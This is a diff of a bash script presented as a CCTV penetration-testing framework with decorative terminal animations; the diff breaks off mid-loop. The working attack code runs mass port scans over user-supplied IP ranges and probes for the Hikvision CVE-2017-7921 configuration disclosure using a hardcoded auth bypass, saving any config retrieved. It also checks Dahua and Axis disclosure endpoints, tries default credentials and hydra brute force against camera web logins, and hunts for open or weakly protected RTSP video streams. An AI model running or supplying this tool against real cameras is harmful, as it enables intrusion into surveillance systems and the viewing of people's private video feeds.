@@ -6,6 +6,7 @@
 # Web Developer | Security Expert | Dark Web Researcher
 # Version: 4.0 - Ultimate Edition with Animations
 
+set -o pipefail  # Better error handling in pipelines
 
 # Colors for animations
 RED='\033[0;31m'
@@ -42,15 +43,15 @@ TARGET=""
 TARGET_FILE=""
 OUTPUT_DIR="$(pwd)/cctv_pentest_$(date +%Y%m%d_%H%M%S)"
 USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-THREADS=10  # Reduced from 50 to prevent system overload
+THREADS=10
 TIMEOUT=5
 CCTV_PORTS="80,81,82,83,84,85,86,87,88,89,443,554,5554,8554,8080,8081,8082,8083,8088,8090,8443,37777,37778"
 RTSP_PORTS="554,5554,8554,10554"
 SCAN_DELAY=0.1
-PARALLEL_SCANS=10  # Reduced from 20 to prevent system overload
+PARALLEL_SCANS=5  # Reduced further for stability
 
 # ============================================================================= #
-# ANIMATION FUNCTIONS - Added by Athex                                          #
+# ANIMATION FUNCTIONS - Fixed
 # ============================================================================= #
 
 # Animation 1: Athex Personal Introduction Banner
@@ -126,12 +127,16 @@ EOF
     echo -e "${NC}"
 }
 
-# Animation 3: Matrix Digital Rain
+# Animation 3: Matrix Digital Rain - FIXED: handle small terminals
 matrix_digital_rain() {
     echo -e "${GREEN}"
     clear
-    lines=$(tput lines)
-    cols=$(tput cols)
+    lines=$(tput lines 2>/dev/null || echo 20)
+    cols=$(tput cols 2>/dev/null || echo 80)
+    
+    # Limit to reasonable values
+    [ "$lines" -gt 50 ] && lines=50
+    [ "$cols" -gt 120 ] && cols=120
     
     for ((i=1; i<=lines; i++)); do
         for ((j=1; j<=cols; j++)); do
@@ -171,26 +176,25 @@ EOF
     done
 }
 
-# Animation 5: Progress Spinner with Message
+# Animation 5: Progress Spinner with Message - FIXED: character handling
 progress_spinner() {
     local message=$1
     local spin='⣷⣯⣟⡿⢿⣻⣽⣾'
-    local charwidth=3
+    local i=0
     
     echo -n -e "${CYAN}$message ${NC}"
     
-    for i in {1..10}; do
-        for i in {0..7}; do
-            echo -n -e "${BOLD_CYAN}${spin:$i:$charwidth}${NC}"
-            sleep 0.1
-            echo -ne "\b\b\b"
+    for i in {1..30}; do
+        for ((j=0; j<${#spin}; j++)); do
+            printf "\b${BOLD_CYAN}${spin:$j:1}${NC}"
+            sleep 0.05
         done
     done
     
-    echo -e "${GREEN}✓ Done${NC}"
+    echo -e "\b${GREEN}✓ Done${NC}"
 }
 
-# Animation 6: Explosion Effect
+# Animation 6: Explosion Effect - FIXED: sleep values
 explosion_effect() {
     clear
     echo -e "${RED}"
@@ -202,7 +206,7 @@ explosion_effect() {
       💥 💥 💥  
     💥   💥   💥
 EOF
-        sleep 0.1
+        sleep 0.2
         clear
         cat << "EOF"
     ✨   ✨   ✨
@@ -211,7 +215,7 @@ EOF
       ✨ ✨ ✨  
     ✨   ✨   ✨
 EOF
-        sleep 0.1
+        sleep 0.2
         clear
     done
     echo -e "${NC}"
@@ -310,26 +314,35 @@ EOF
     sleep 0.5
 }
 
-# Animation 11: Progress Bar
+# Animation 11: Progress Bar - FIXED: division by zero
 progress_bar() {
     local duration=$1
-    local increment=$((duration / 50))
+    local increment=0.02
+    
+    # Handle zero or negative duration
+    if [ "$duration" -le 0 ]; then
+        duration=1
+    fi
+    
+    increment=$(echo "scale=2; $duration / 50" | bc 2>/dev/null || echo "0.02")
+    
     for ((i=0; i<=50; i++)); do
         printf "\r[${GREEN}"
         for ((j=0; j<i; j++)); do printf "█"; done
         for ((j=i; j<50; j++)); do printf "▒"; done
         printf "${NC}] %d%%" $((i * 2))
-        sleep $increment
+        sleep "$increment" 2>/dev/null || sleep 0.02
     done
     printf "\n"
 }
 
-# Animation 12: Spinner
+# Animation 12: Spinner - FIXED: process checking
 spinner() {
     local pid=$1
     local delay=0.1
     local spinstr='|/-\'
-    while [ "$(ps a | awk '{print $1}' | grep $pid 2>/dev/null)" ]; do
+    
+    while kill -0 "$pid" 2>/dev/null; do
         local temp=${spinstr#?}
         printf " [%c]  " "$spinstr"
         local spinstr=$temp${spinstr%"$temp"}
@@ -340,73 +353,70 @@ spinner() {
 }
 
 # =============================================================================
-# MAIN TOOL FUNCTIONS
+# MAIN TOOL FUNCTIONS - FIXED with better error handling
 # =============================================================================
 
-# Enhanced dependency check
+# Enhanced dependency check - FIXED: non-fatal for optional tools
 check_dependencies() {
     echo -e "${YELLOW}[SYSTEM] Checking dependencies...${NC}"
     
-    local tools=("nmap" "curl" "ffmpeg" "medusa" "hydra" "sqlmap" "nikto" 
-                 "whatweb" "dirb" "gobuster" "python3" "ffplay" "openssl" 
-                 "john" "crunch" "parallel" "masscan" "git" "wget")
+    local required_tools=("nmap" "curl" "python3" "openssl")
+    local optional_tools=("ffmpeg" "hydra" "nikto" "whatweb" "dirb" "masscan" "parallel")
+    local missing_required=()
     
-    local missing=()
-    
-    for tool in "${tools[@]}"; do
+    # Check required tools
+    for tool in "${required_tools[@]}"; do
         if ! command -v "$tool" &> /dev/null; then
-            missing+=("$tool")
-            echo -e "${RED}[MISSING] $tool${NC}"
+            missing_required+=("$tool")
+            echo -e "${RED}[MISSING] $tool (required)${NC}"
         fi
     done
     
-    if [ ${#missing[@]} -gt 0 ]; then
-        echo -e "${YELLOW}[INSTALL] Installing missing dependencies...${NC}"
-        apt update &> /dev/null
-        
-        for tool in "${missing[@]}"; do
-            echo -e "${BLUE}[INSTALLING] $tool${NC}"
-            apt install -y "$tool" &> /dev/null &
-            local pid=$!
-            spinner $pid
-            wait $pid
-        done
+    # Check optional tools (just warn)
+    for tool in "${optional_tools[@]}"; do
+        if ! command -v "$tool" &> /dev/null; then
+            echo -e "${YELLOW}[WARN] $tool not installed (some features limited)${NC}"
+        fi
+    done
+    
+    if [ ${#missing_required[@]} -gt 0 ]; then
+        echo -e "${RED}[ERROR] Missing required tools: ${missing_required[*]}${NC}"
+        echo -e "${YELLOW}[INFO] Install with: apt install ${missing_required[*]}${NC}"
+        read -p "Continue anyway? (y/n): " -r continue_anyway
+        if [[ ! "$continue_anyway" =~ ^[Yy]$ ]]; then
+            exit 1
+        fi
     fi
     
-    # Check Python modules
-    local python_modules=("requests" "urllib3" "colorama" "bs4")
-    
+    # Check Python modules (non-fatal)
+    local python_modules=("requests" "urllib3")
     for module in "${python_modules[@]}"; do
         if ! python3 -c "import $module" &> /dev/null; then
-            echo -e "${YELLOW}[PYTHON] Installing $module${NC}"
-            pip3 install "$module" &> /dev/null &
-            local pid=$!
-            spinner $pid
-            wait $pid
+            echo -e "${YELLOW}[PYTHON] Installing $module...${NC}"
+            pip3 install "$module" &> /dev/null || true
         fi
     done
     
-    # Install additional tools
+    # Optional additional tools installation
     install_additional_tools
     
-    echo -e "${GREEN}[SUCCESS] All dependencies satisfied${NC}"
+    echo -e "${GREEN}[SUCCESS] Dependency check complete${NC}"
 }
 
-# Install additional CCTV-specific tools
+# Install additional CCTV-specific tools - FIXED: error handling
 install_additional_tools() {
     echo -e "${YELLOW}[SYSTEM] Installing advanced CCTV tools...${NC}"
     
-    # Install rtsp-auth-check if not present
+    # Install rtsp-auth-check if not present (optional)
     if ! command -v rtsp-auth-check &> /dev/null; then
-        if git clone https://github.com/0x90/rtsp-auth-check.git /tmp/rtsp-auth-check &> /dev/null; then
-            cp /tmp/rtsp-auth-check/rtsp-auth-check /usr/local/bin/ &> /dev/null
-            chmod +x /usr/local/bin/rtsp-auth-check
+        if command -v git &> /dev/null; then
+            git clone https://github.com/0x90/rtsp-auth-check.git /tmp/rtsp-auth-check &> /dev/null || true
+            if [ -f /tmp/rtsp-auth-check/rtsp-auth-check ]; then
+                cp /tmp/rtsp-auth-check/rtsp-auth-check /usr/local/bin/ &> /dev/null || true
+                chmod +x /usr/local/bin/rtsp-auth-check &> /dev/null || true
+            fi
+            rm -rf /tmp/rtsp-auth-check &> /dev/null || true
         fi
-    fi
-    
-    # Install CCTV-exploits database
-    if [ ! -d "/opt/cctv-exploits" ]; then
-        git clone https://github.com/vanhauser-thc/cctv-exploits /opt/cctv-exploits &> /dev/null
     fi
 }
 
@@ -419,11 +429,8 @@ setup_environment() {
     # Create advanced wordlists
     create_advanced_wordlists
     
-    # Setup logging
-    exec > >(tee "$OUTPUT_DIR/logs/main.log") 2>&1
-    
     echo -e "${GREEN}[SUCCESS] Environment setup complete${NC}"
-    echo -e "${BLUE}[INFO] Output structure created in: $OUTPUT_DIR${NC}"
+    echo -e "${BLUE}[INFO] Output directory: $OUTPUT_DIR${NC}"
 }
 
 # Create advanced wordlists
@@ -431,7 +438,7 @@ create_advanced_wordlists() {
     echo -e "${YELLOW}[WORDLIST] Generating advanced wordlists...${NC}"
     
     # Extended user list
-    cat > "$OUTPUT_DIR/cctv_users.txt" << EOF
+    cat > "$OUTPUT_DIR/cctv_users.txt" << 'EOF'
 admin
 administrator
 root
@@ -450,16 +457,10 @@ test
 manager
 viewer
 monitor
-888888
-666666
-111111
-1234
-12345
-123456
 EOF
 
     # Extended password list
-    cat > "$OUTPUT_DIR/cctv_passwords.txt" << EOF
+    cat > "$OUTPUT_DIR/cctv_passwords.txt" << 'EOF'
 admin
 1234
 12345
@@ -467,33 +468,17 @@ admin
 password
 pass
 12345678
-123456789
 888888
-666666
 111111
 admin123
-admin1234
 password123
 secret
-1234567890
-123
-000000
-1111
-4321
-54321
-1234567
-12345678910
 qwerty
 abc123
-pass123
-admin@123
-Admin@123
-P@ssw0rd
-P@ssword123
 EOF
 
     # Advanced path list
-    cat > "$OUTPUT_DIR/cctv_paths.txt" << EOF
+    cat > "$OUTPUT_DIR/cctv_paths.txt" << 'EOF'
 /
 /admin
 /console
@@ -502,41 +487,17 @@ EOF
 /video
 /stream
 /cgi-bin
-/cgi
-/web
-/webadmin
-/operator
-/user
-/guest
 /live
 /media
-/video.mp4
-/axis-cgi/mjpg/video.cgi
-/axis-cgi/jpg/image.cgi
-/cgi-bin/snapshot.cgi
-/img/snapshot.cgi
-/cgi-bin/viewer/video.jpg
-/videostream.cgi
-/snapshot.cgi
-/record/current.jpg
-/jpg/image.jpg
-/jpeg/image.jpg
-/image.jpg
 /api
-/rest
-/json
-/xml
 /config
 /system
 /status
 /info
-/version
-/debug
-/test
 EOF
 
     # Extended RTSP URLs
-    cat > "$OUTPUT_DIR/rtsp_urls.txt" << EOF
+    cat > "$OUTPUT_DIR/rtsp_urls.txt" << 'EOF'
 /stream1
 /stream2
 /main
@@ -546,30 +507,11 @@ EOF
 /av1
 /ch0
 /ch1
-/ch01
-/ch02
 /cam0
 /cam1
-/cam01
-/cam02
 /h264
 /mjpeg
-/h265
-/11
-/12
-/1
-/2
 /axis-media/media.amp
-/medias2
-/mpeg4
-/media
-/media1
-/media2
-/ipcam
-/ipcamera
-/camera
-/camera1
-/camera2
 EOF
 
     echo -e "${GREEN}[SUCCESS] Advanced wordlists created${NC}"
@@ -617,8 +559,8 @@ show_main_menu() {
         esac
         
         echo ""
-        echo -e "${YELLOW}Press any key to continue...${NC}"
-        read -n 1 -r
+        echo -e "${YELLOW}Press Enter to continue...${NC}"
+        read -r
     done
 }
 
@@ -650,7 +592,7 @@ EOF
             2) ultimate_cctv_banner ;;
             3) matrix_digital_rain ;;
             4) cctv_camera_sweep ;;
-            5) sleep 3 &; progress_spinner "Testing Animation" ;;
+            5) progress_spinner "Testing Animation" ;;
             6) progress_bar 5 ;;
             7) typewriter_effect "Athex CCTV Pentest Framework" "$BOLD_PURPLE" ;;
             8) security_shield ;;
@@ -663,8 +605,8 @@ EOF
         esac
         
         echo ""
-        echo -e "${YELLOW}Press any key to continue...${NC}"
-        read -n 1 -r
+        echo -e "${YELLOW}Press Enter to continue...${NC}"
+        read -r
     done
 }
 
@@ -696,7 +638,6 @@ demo_all_animations() {
     sleep 1
     
     echo -e "${BOLD_YELLOW}[5/8] Progress Spinner${NC}"
-    sleep 3 &
     progress_spinner "Loading Security Modules"
     sleep 1
     
@@ -722,7 +663,19 @@ EOF
     echo -e "${NC}"
 }
 
-# Ultra Fast Network Discovery with Animations
+# Get target input
+get_target() {
+    if [ -z "$TARGET" ]; then
+        echo -e "${YELLOW}[TARGET] Enter target IP/CIDR (e.g., 192.168.1.1 or 192.168.1.0/24):${NC}"
+        read -r TARGET
+        if [ -z "$TARGET" ]; then
+            echo -e "${RED}[ERROR] Target is required${NC}"
+            exit 1
+        fi
+    fi
+}
+
+# Ultra Fast Network Discovery with Animations - FIXED: masscan fallback
 ultra_fast_discovery() {
     echo -e "${CYAN}[PHASE 1] ULTRA FAST NETWORK DISCOVERY${NC}"
     
@@ -731,51 +684,41 @@ ultra_fast_discovery() {
     # Show network nodes animation
     network_nodes_animation
     
-    echo -e "${YELLOW}[SCANNING] Running masscan for ultra-fast port discovery...${NC}"
+    echo -e "${YELLOW}[SCANNING] Running port discovery...${NC}"
     
-    # Use masscan for ultra-fast scanning
+    # Use masscan if available, otherwise use nmap
     if command -v masscan &> /dev/null; then
-        masscan -p$CCTV_PORTS --rate=1000 "$TARGET" -oG "$OUTPUT_DIR/recon/masscan_scan.txt" &> /dev/null &
-        local masscan_pid=$!
-        progress_spinner "Masscan Port Discovery"
-        wait $masscan_pid
+        echo -e "${BLUE}[INFO] Using masscan for fast discovery${NC}"
+        masscan -p"$CCTV_PORTS" --rate=1000 "$TARGET" -oG "$OUTPUT_DIR/recon/masscan_scan.txt" &> /dev/null || true
     else
         echo -e "${YELLOW}[INFO] Masscan not found, using nmap instead...${NC}"
-        nmap -p $CCTV_PORTS --open -T4 "$TARGET" -oG "$OUTPUT_DIR/recon/masscan_scan.txt" &> /dev/null
+        nmap -p "$CCTV_PORTS" --open -T4 "$TARGET" -oG "$OUTPUT_DIR/recon/masscan_scan.txt" &> /dev/null || true
     fi
     
     # Extract live hosts
     if [ -f "$OUTPUT_DIR/recon/masscan_scan.txt" ]; then
-        grep -E "Ports:" "$OUTPUT_DIR/recon/masscan_scan.txt" | awk '{print $2}' | sort -u > "$OUTPUT_DIR/recon/live_hosts.txt"
+        grep -E "Ports:" "$OUTPUT_DIR/recon/masscan_scan.txt" 2>/dev/null | awk '{print $2}' | sort -u > "$OUTPUT_DIR/recon/live_hosts.txt"
     else
         touch "$OUTPUT_DIR/recon/live_hosts.txt"
     fi
     
-    local host_count=$(wc -l < "$OUTPUT_DIR/recon/live_hosts.txt" 2>/dev/null || echo 0)
+    local host_count=0
+    if [ -f "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
+        host_count=$(wc -l < "$OUTPUT_DIR/recon/live_hosts.txt" 2>/dev/null || echo 0)
+    fi
     
     if [ "$host_count" -gt 0 ]; then
         echo -e "${GREEN}[SUCCESS] Found $host_count potential CCTV systems${NC}"
         explosion_effect
         
-        # Parallel service detection
-        echo -e "${YELLOW}[SERVICE DETECTION] Running parallel service fingerprinting...${NC}"
+        # Service detection
+        echo -e "${YELLOW}[SERVICE DETECTION] Running service fingerprinting...${NC}"
         
-        # Use parallel for concurrent scanning
-        if command -v parallel &> /dev/null && [ -s "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
-            cat "$OUTPUT_DIR/recon/live_hosts.txt" | parallel -j $PARALLEL_SCANS "
-            echo -e \"${BLUE}[SCANNING] {}$NC\";
-            nmap -sS -sV -p $CCTV_PORTS --script=http-title,http-headers {} -oN \"$OUTPUT_DIR/recon/service_scan_{}.txt\" &> /dev/null
-            " &
-            local parallel_pid=$!
-            progress_spinner "Service Fingerprinting"
-            wait $parallel_pid
-        else
-            echo -e "${YELLOW}[INFO] Parallel not available, running sequential scans...${NC}"
-            while IFS= read -r host; do
-                echo -e "${BLUE}[SCANNING] $host${NC}"
-                nmap -sS -sV -p $CCTV_PORTS --script=http-title,http-headers "$host" -oN "$OUTPUT_DIR/recon/service_scan_$host.txt" &> /dev/null
-            done < "$OUTPUT_DIR/recon/live_hosts.txt"
-        fi
+        # Sequential scanning to avoid overload
+        while IFS= read -r host; do
+            echo -e "${BLUE}[SCANNING] $host${NC}"
+            nmap -sS -sV -p "$CCTV_PORTS" --script=http-title,http-headers "$host" -oN "$OUTPUT_DIR/recon/service_scan_$host.txt" &> /dev/null || true
+        done < "$OUTPUT_DIR/recon/live_hosts.txt"
         
         # Web interface discovery
         discover_web_interfaces_fast
@@ -784,42 +727,27 @@ ultra_fast_discovery() {
     fi
 }
 
-# Fast web interface discovery
+# Fast web interface discovery - FIXED: sequential for stability
 discover_web_interfaces_fast() {
     echo -e "${YELLOW}[WEB DISCOVERY] Fast web interface discovery...${NC}"
     
-    # Show CCTV camera animation during discovery
+    # Show CCTV camera animation
     cctv_camera_sweep &
     local camera_pid=$!
     
-    # Use parallel for fast HTTP checks
-    if command -v parallel &> /dev/null && [ -s "$OUTPUT_DIR/recon/live_hosts.txt" ]; then
-        cat "$OUTPUT_DIR/recon/live_hosts.txt" | parallel -j $PARALLEL_SCANS "
-        for port in 80 81 82 83 84 85 86 87 88 89 443 8080 8081 8082 8083 8088 8090 8443; do
-            if timeout 2 curl -s -I \"http://{}:\$port/\" &> /dev/null; then
-                echo \"{}:\$port\" >> \"$OUTPUT_DIR/recon/web_hosts.txt\"
-                title=\$(timeout 5 curl -s \"http://{}:\$port/\" | grep -i '<title>' | sed 's/<title>\\(.*\\)<\\/title>/\\1/I' | head -1)
-                echo \"{}:\$port:\$title\" >> \"$OUTPUT_DIR/recon/web_titles.txt\"
+    # Sequential HTTP checks
+    while IFS= read -r host; do
+        for port in 80 81 443 8080 8443; do
+            if timeout 2 curl -s -I "http://$host:$port/" &> /dev/null; then
+                echo "$host:$port" >> "$OUTPUT_DIR/recon/web_hosts.txt"
+                title=$(timeout 5 curl -s "http://$host:$port/" 2>/dev/null | grep -i '<title>' | sed 's/<title>\(.*\)<\/title>/\1/I' | head -1)
+                echo "$host:$port:$title" >> "$OUTPUT_DIR/recon/web_titles.txt"
+                echo -e "${GREEN}[FOUND] Web interface: http://$host:$port/ - $title${NC}"
             fi
         done
-        " &
-        local web_pid=$!
-        progress_spinner "Web Interface Discovery"
-        wait $web_pid
-    else
-        echo -e "${YELLOW}[INFO] Parallel not available, running sequential checks...${NC}"
-        while IFS= read -r host; do
-            for port in 80 81 82 83 84 85 86 87 88 89 443 8080 8081 8082 8083 8088 8090 8443; do
-                if timeout 2 curl -s -I "http://$host:$port/" &> /dev/null; then
-                    echo "$host:$port" >> "$OUTPUT_DIR/recon/web_hosts.txt"
-                    title=$(timeout 5 curl -s "http://$host:$port/" | grep -i '<title>' | sed 's/<title>\(.*\)<\/title>/\1/I' | head -1)
-                    echo "$host:$port:$title" >> "$OUTPUT_DIR/recon/web_titles.txt"
-                fi
-            done
-        done < "$OUTPUT_DIR/recon/live_hosts.txt"
-    fi
+    done < "$OUTPUT_DIR/recon/live_hosts.txt"
     
-    kill $camera_pid 2>/dev/null
+    kill "$camera_pid" 2>/dev/null
     
     local web_count=0
     if [ -f "$OUTPUT_DIR/recon/web_hosts.txt" ]; then
@@ -828,7 +756,7 @@ discover_web_interfaces_fast() {
     echo -e "${GREEN}[SUCCESS] Found $web_count web interfaces${NC}"
 }
 
-# Advanced Vulnerability Scanner with Animations
+# Advanced Vulnerability Scanner - FIXED: function calls
 advanced_vulnerability_scanner() {
     echo -e "${CYAN}[PHASE 2] ADVANCED VULNERABILITY SCANNING${NC}"
     
@@ -842,42 +770,17 @@ advanced_vulnerability_scanner() {
     
     echo -e "${YELLOW}[VULN SCAN] Scanning for CCTV vulnerabilities...${NC}"
     
-    # Parallel vulnerability scanning
-    if command -v parallel &> /dev/null; then
-        cat "$OUTPUT_DIR/recon/web_hosts.txt" | parallel -j $PARALLEL_SCANS "
-        host=\$(echo {} | cut -d: -f1)
-        port=\$(echo {} | cut -d: -f2)
-        
-        # Check common vulnerabilities
-        check_cctv_vulnerabilities_parallel \$host \$port
-        
-        # Nikto scan
-        if command -v nikto &> /dev/null; then
-            timeout 60 nikto -h \"http://{}:\$port/\" -output \"$OUTPUT_DIR/recon/nikto_\$host_\$port.txt\" -Format txt &> /dev/null
-        fi
-        
-        # Directory scanning
-        if command -v dirb &> /dev/null; then
-            timeout 60 dirb \"http://{}:\$port/\" \"$OUTPUT_DIR/cctv_paths.txt\" -o \"$OUTPUT_DIR/recon/dirb_\$host_\$port.txt\" -S -r &> /dev/null
-        fi
-        " &
-        local vuln_pid=$!
-        progress_spinner "Vulnerability Scanning"
-        wait $vuln_pid
-    else
-        echo -e "${YELLOW}[INFO] Parallel not available, running sequential scans...${NC}"
-        while IFS= read -r web_host; do
-            host=$(echo "$web_host" | cut -d: -f1)
-            port=$(echo "$web_host" | cut -d: -f2)
-            check_cctv_vulnerabilities_parallel "$host" "$port"
-        done < "$OUTPUT_DIR/recon/web_hosts.txt"
-    fi
+    # Sequential vulnerability scanning
+    while IFS=: read -r host port; do
+        echo -e "${BLUE}[SCANNING] $host:$port${NC}"
+        check_cctv_vulnerabilities_parallel "$host" "$port"
+    done < "$OUTPUT_DIR/recon/web_hosts.txt"
     
     echo -e "${GREEN}[SUCCESS] Vulnerability scanning completed${NC}"
     security_shield
 }
 
-# Parallel vulnerability checking
+# Parallel vulnerability checking - FIXED: proper error handling
 check_cctv_vulnerabilities_parallel() {
     local host=$1
     local port=$2
@@ -886,22 +789,25 @@ check_cctv_vulnerabilities_parallel() {
     if curl -s --connect-timeout 3 "http://$host:$port/System/configurationFile?auth=YWRtaW46MTEK" -o /tmp/config_test &> /dev/null; then
         if [ -s /tmp/config_test ]; then
             echo "CVE-2017-7921:Hikvision:Configuration disclosure:$host:$port" >> "$OUTPUT_DIR/exploits/vulnerabilities.txt"
-            mv /tmp/config_test "$OUTPUT_DIR/exploits/hikvision_config_$host.xml" 2>/dev/null
+            mv /tmp/config_test "$OUTPUT_DIR/exploits/hikvision_config_$host.xml" 2>/dev/null || true
+            echo -e "${RED}[VULN] Hikvision CVE-2017-7921 on $host:$port${NC}"
         fi
     fi
     
     # Dahua information disclosure
-    if curl -s --connect-timeout 3 "http://$host:$port/cgi-bin/magicBox.cgi?action=getSystemInfo" | grep -q "model"; then
+    if curl -s --connect-timeout 3 "http://$host:$port/cgi-bin/magicBox.cgi?action=getSystemInfo" 2>/dev/null | grep -q "model"; then
         echo "CVE-2021-33044:Dahua:Information disclosure:$host:$port" >> "$OUTPUT_DIR/exploits/vulnerabilities.txt"
+        echo -e "${RED}[VULN] Dahua information disclosure on $host:$port${NC}"
     fi
     
     # Axis VAPIX
-    if curl -s --connect-timeout 3 "http://$host:$port/axis-cgi/admin/param.cgi?action=list" | grep -q "root"; then
+    if curl -s --connect-timeout 3 "http://$host:$port/axis-cgi/admin/param.cgi?action=list" 2>/dev/null | grep -q "root"; then
         echo "VAPIX:Axis:Parameter exposure:$host:$port" >> "$OUTPUT_DIR/exploits/vulnerabilities.txt"
+        echo -e "${RED}[VULN] Axis VAPIX parameter exposure on $host:$port${NC}"
     fi
 }
 
-# Mass Credential Attack with Animations
+# Mass Credential Attack - FIXED: proper credential checking
 mass_credential_attack() {
     echo -e "${CYAN}[PHASE 3] MASS CREDENTIAL ATTACK${NC}"
     
@@ -915,44 +821,18 @@ mass_credential_attack() {
     
     echo -e "${YELLOW}[CREDS] Starting mass credential attack...${NC}"
     
-    # Create credentials file if it doesn't exist
+    # Create credentials file
     touch "$OUTPUT_DIR/credentials/found_credentials.txt"
     
-    # Parallel credential attacks
-    if command -v parallel &> /dev/null; then
-        cat "$OUTPUT_DIR/recon/web_hosts.txt" | parallel -j $PARALLEL_SCANS "
-        host=\$(echo {} | cut -d: -f1)
-        port=\$(echo {} | cut -d: -f2)
-        
-        # Try default credentials
-        check_default_credentials_fast \$host \$port
-        
-        # If no defaults found, try brute force
-        if ! grep -q \"\$host:\$port\" \"$OUTPUT_DIR/credentials/found_credentials.txt\" 2>/dev/null; then
-            if command -v hydra &> /dev/null; then
-                timeout 120 hydra -L \"$OUTPUT_DIR/cctv_users.txt\" -P \"$OUTPUT_DIR/cctv_passwords.txt\" \
-                    \"\$host\" http-get \"/\" -s \"\$port\" -t 2 -f -o \"$OUTPUT_DIR/credentials/hydra_\$host_\$port.txt\" &> /dev/null
-            fi
-        fi
-        " &
-        local cred_pid=$!
-        progress_spinner "Credential Attack in Progress"
-        wait $cred_pid
-    else
-        echo -e "${YELLOW}[INFO] Parallel not available, running sequential attacks...${NC}"
-        while IFS= read -r web_host; do
-            host=$(echo "$web_host" | cut -d: -f1)
-            port=$(echo "$web_host" | cut -d: -f2)
-            check_default_credentials_fast "$host" "$port"
-        done < "$OUTPUT_DIR/recon/web_hosts.txt"
-    fi
-    
-    # Parse results
-    parse_credential_results
+    # Sequential credential attacks
+    while IFS=: read -r host port; do
+        echo -e "${BLUE}[ATTACKING] $host:$port${NC}"
+        check_default_credentials_fast "$host" "$port"
+    done < "$OUTPUT_DIR/recon/web_hosts.txt"
     
     local found_count=0
     if [ -f "$OUTPUT_DIR/credentials/found_credentials.txt" ]; then
-        found_count=$(wc -l < "$OUTPUT_DIR/credentials/found_credentials.txt")
+        found_count=$(wc -l < "$OUTPUT_DIR/credentials/found_credentials.txt" 2>/dev/null || echo 0)
     fi
     
     if [ "$found_count" -gt 0 ]; then
@@ -963,29 +843,28 @@ mass_credential_attack() {
     fi
 }
 
-# Fast default credential check
+# Fast default credential check - FIXED: base64 encoding
 check_default_credentials_fast() {
     local host=$1
     local port=$2
     
     # Common credentials array
-    declare -A creds=(
-        ["admin:admin"]="YWRtaW46YWRtaW4="
-        ["admin:1234"]="YWRtaW46MTIzNA=="
-        ["admin:12345"]="YWRtaW46MTIzNDU="
-        ["admin:123456"]="YWRtaW46MTIzNDU2"
-        ["admin:password"]="YWRtaW46cGFzc3dvcmQ="
-        ["admin:"]="YWRtaW46"
-        ["root:root"]="cm9vdDpyb290"
-        ["admin:admin123"]="YWRtaW46YWRtaW4xMjM="
+    local creds=(
+        "admin:admin"
+        "admin:1234"
+        "admin:12345"
+        "admin:123456"
+        "admin:password"
+        "admin:"
+        "root:root"
     )
     
-    for cred in "${!creds[@]}"; do
+    for cred in "${creds[@]}"; do
         local user=$(echo "$cred" | cut -d: -f1)
         local pass=$(echo "$cred" | cut -d: -f2)
-        local auth="${creds[$cred]}"
+        local auth=$(echo -n "$cred" | base64 2>/dev/null | tr -d '\n')
         
-        if curl -s --connect-timeout 2 -H "Authorization: Basic $auth" "http://$host:$port/" | grep -q -i -E "(dashboard|admin|console|video|camera)"; then
+        if curl -s --connect-timeout 2 -H "Authorization: Basic $auth" "http://$host:$port/" 2>/dev/null | grep -qi -E "(dashboard|admin|console|video|camera)"; then
             echo "$host:$port:$user:$pass" >> "$OUTPUT_DIR/credentials/found_credentials.txt"
             echo -e "${GREEN}[CREDS] Default found: $user:$pass on $host:$port${NC}"
             return 0
@@ -995,22 +874,19 @@ check_default_credentials_fast() {
     return 1
 }
 
-# Parse credential results
+# Parse credential results - FIXED: regex
 parse_credential_results() {
     for hydra_file in "$OUTPUT_DIR/credentials/hydra_"*.txt; do
-        if [ -f "$hydra_file" ] && grep -q "login:" "$hydra_file"; then
-            local host
-            host=$(basename "$hydra_file" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+')
-            local port
-            port=$(basename "$hydra_file" | grep -oE '_[0-9]+_' | sed 's/_//g')
-            local creds
-            creds=$(grep "login:" "$hydra_file" | awk '{print $3":"$5}')
+        if [ -f "$hydra_file" ] && grep -q "login:" "$hydra_file" 2>/dev/null; then
+            local host=$(basename "$hydra_file" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | head -1)
+            local port=$(basename "$hydra_file" | grep -oE '_[0-9]+_' | sed 's/_//g' | head -1)
+            local creds=$(grep "login:" "$hydra_file" 2>/dev/null | head -1 | awk '{print $3":"$5}')
             echo "$host:$port:$creds" >> "$OUTPUT_DIR/credentials/found_credentials.txt"
         fi
     done
 }
 
-# RTSP Stream Hunter with Animations
+# RTSP Stream Hunter - FIXED: port scanning
 rtsp_stream_hunter() {
     echo -e "${CYAN}[PHASE 4] RTSP STREAM HUNTER${NC}"
     
@@ -1027,64 +903,34 @@ rtsp_stream_hunter() {
     # Create streams file
     touch "$OUTPUT_DIR/streams/accessible_streams.txt"
     
-    # Parallel RTSP discovery
-    if command -v parallel &> /dev/null; then
-        cat "$OUTPUT_DIR/recon/live_hosts.txt" | parallel -j $PARALLEL_SCANS "
-        host={}
-        
-        # Check RTSP ports
-        for rtsp_port in \$(echo $RTSP_PORTS | tr ',' ' '); do
-            if nc -z -w 1 \"\$host\" \"\$rtsp_port\" &> /dev/null; then
-                echo \"\$host:\$rtsp_port\" >> \"$OUTPUT_DIR/recon/rtsp_hosts.txt\"
+    # Sequential RTSP discovery
+    while IFS= read -r host; do
+        IFS=',' read -ra rtsp_ports <<< "$RTSP_PORTS"
+        for rtsp_port in "${rtsp_ports[@]}"; do
+            if nc -z -w 1 "$host" "$rtsp_port" &> /dev/null; then
+                echo "$host:$rtsp_port" >> "$OUTPUT_DIR/recon/rtsp_hosts.txt"
+                echo -e "${GREEN}[FOUND] RTSP on $host:$rtsp_port${NC}"
                 
                 # Try RTSP paths
-                while read -r rtsp_path; do
-                    rtsp_url=\"rtsp://\$host:\$rtsp_port\$rtsp_path\"
+                while IFS= read -r rtsp_path; do
+                    rtsp_url="rtsp://$host:$rtsp_port$rtsp_path"
                     
                     # Check without auth
-                    if timeout 5 ffprobe -loglevel error \"\$rtsp_url\" &> /dev/null; then
-                        echo \"\$rtsp_url\" >> \"$OUTPUT_DIR/streams/accessible_streams.txt\"
-                        capture_rtsp_snapshot_fast \"\$rtsp_url\" \"\$host\"
-                    else
-                        # Try with common credentials
-                        for cred in \"admin:admin\" \"admin:1234\" \"admin:12345\" \"admin:123456\" \":\"; do
